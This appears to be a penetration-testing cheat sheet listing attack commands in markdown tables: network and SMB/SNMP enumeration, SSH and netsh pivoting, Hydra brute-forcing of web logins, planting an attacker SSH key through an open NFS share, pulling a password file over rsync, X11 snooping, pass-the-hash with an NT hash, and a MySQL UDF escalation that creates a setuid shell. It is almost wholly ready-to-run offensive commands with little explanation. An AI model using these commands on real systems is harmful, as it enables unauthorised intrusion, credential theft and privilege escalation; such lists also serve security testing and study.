
### Service Enumeration
| for Example  |
| ------------- |
|nmap -Pn -n --open -p500  192.168.0.0/24 |
|nmap -Pn -n --open -p161  192.168.0.0/24 |
|nmap -p445 --script smb-vuln-ms17-010 x.x.x.0/24|
|nmap -sV --script=realvnc-auth-bypass x.x.x.0/24|
|nmap --script http-webdav-scan -p80,8080 x.x.x.0/24|
|nmap -p80 --script http-default-account x.x.x.0/24|
|nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.6.0/24  |
|nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24 |
|nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 |
|nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 192.168.2.9/24 | awk '/22\/open/ {print $2}' |


### RPC services Enumeration

| for Example |
| ------------- |
|smbmap -H 10.10.10.103 # N No password |
|smbclient -N -L \\\\192.168.1.1|
|smbclient -N //192.168.1.1/SYSVOL|
|smbmap -H 10.10.10.103 -u MeMe -p 123456aQ |
|smbclient \\\\10.10.10.100\\NETLOGON|
|smbclient \\\\10.10.10.100\\Replication|
|smbmap -u MeMe -r BatShare -H 10.10.10.130|
| smbmap -u MeME--download Secret\\Password.zip -H 192.168.1.1|
|smbmap.py -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18|
| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
|smbclient \\\\10.10.10.103\\C$  -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267|
| mount -t cifs //10.10.10.134/Backups /mnt/smb #Mount|

### Commonly Users and Service Enumeration Through Running RPC and SNMP Services

|for Example  |
| ------------- |
|rpcclient –U “” [target IP address] |
| > querydominfo |
| >enumdomusers|
| >queryuser msfadmin| 
| >queryuser msfadmin|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25 #User|
|snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2 # Running Service|
| snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5 #Hostname |
|snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1 #Share Information|
|snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3 #Openning Port|



### Advanced SSH and Window PortProxy Tunneling and Port Forwarding

| for Example |
| ------------- |
|ssh -L 127.0.0.1:8080:127.0.0.1:80 remotehost |
|ssh -nNT -L 8000:localhost:3306 user@pivoting host #Local Port Forwarding |
|ssh -nNT -R 0.0.0.0:4000:192.168.1.101:631 user@pivot host |
|ssh -D 5000 -nNT user@pivoting host #SOCKS Proxy|
|ssh -p 13339 -f -N j0hn@10.11.1.252  |
|ssh -N -f -D 8888 -p 22000 j0hn@192.168.13.252 |
|plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8 #winexe -U Administrator //127.0.0.1 "cmd.exe|
|plink.exe -l root -pw  -R 3389:127.0.0.1:3389 10.10.14.8 #rdesktop -U Administrator 127.0.0.1 |
|ssh -nNT -R 3389:localhost:3389 user@pivot host #Remote Port Forward |
|netsh interface portproxy add v4tov4 listenport=1111 Compromise Box=x.x.x.1 connectport=1111 connectaddress=Attacker|
|netsh interface portproxy add v4tov4 listenport=1111 listenaddress=x.x.x.1 connectport=1111 connectaddress=x.x.x.10 |
|netsh interface portproxy add v4tov4 listenport=9001 listenaddress=x.x.x.1 connectport=9001 connectaddress=x.x.x.100 |



### Avance Cracking Web Forms with Hydra

| For example  |
| ------------- |
|hydra -l admin -P /usr/share/wordlists/rockyou.txt  -f -V -s 80 192.168.1.2 http-get /wp-admin/|
|hydra -l root -P /usr/share/wordlists/rockyou.txt  -f -V -s 7001 178.72.90.181 http-post-form "/cgi-bin/luci:username=^USER^&password=^PASS^:Invalid username"|
|hydra 192.168.100.155 -V -l admin -P passwordlist http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low"|
|hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list|
|hydra -l IRISnoir -P /usr/share/wordlists/rockyou.txt -e nsr -v -V http-post-form://testasp.vulnweb.com/"Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout"|




### Insecure NFS Share Vulnerabilities

| for Example |
| ------------- |
| showmount -e 192.168.100.25 #Check if any share is available |
| mount -t nfs 192.168.100.25:/home /tmp/NFS |
| mount -t nfs 192.168.1.112:/ /mnt -o nolock |
| mkdir -p /root/.ssh # We May Upload SSH Key to NFS |
| ssh-keygen -t rsa -b 4096 |
| cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ |
| cat authorized_keys |
| cat id_rsa.pub >> authorized_keys |
|ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|

### Insecure Rsync Service

| for Example |
| ------------- |
|rsync 192.168.1.171:: |
|rsync 192.168.1.171::files |
| rsync -r 192.168.1.171::files/tmp/ |
|rsync 192.168.1.171::files/home/test/mypassword.txt |
| rsync -r 192.168.1.171::files/home/test/ |
| rsync ./myfile.txt 192.168.1.171::files/home/test |
|rsync -r ./myfolder 192.168.1.171::files/home/test |


### X 11  Common Vulnerability

| for Example  |
| ------------- |
| nmap -p 6000 --script=x11-access 192.168.2.26,75 |
| create table npn(line blob); |
| xdpyinfo -display 192.168.2.75:0 | head -n 5 |
| xspy -display 192.168.1.23:0 -delay 100 |



### MySQL Privilge Escalation Through UDF

| for Example|
| ------------- |
|gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc|
| use mysql; |
|create table npn(line blob); |
| insert into npn values(load_file('/tmp/raptor_udf2.so')); |
|select * from npn into dumpfile '/usr/lib/raptor_udf2.so';|
| create function do_system returns integer soname 'raptor_udf2.so'; |
| select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); |
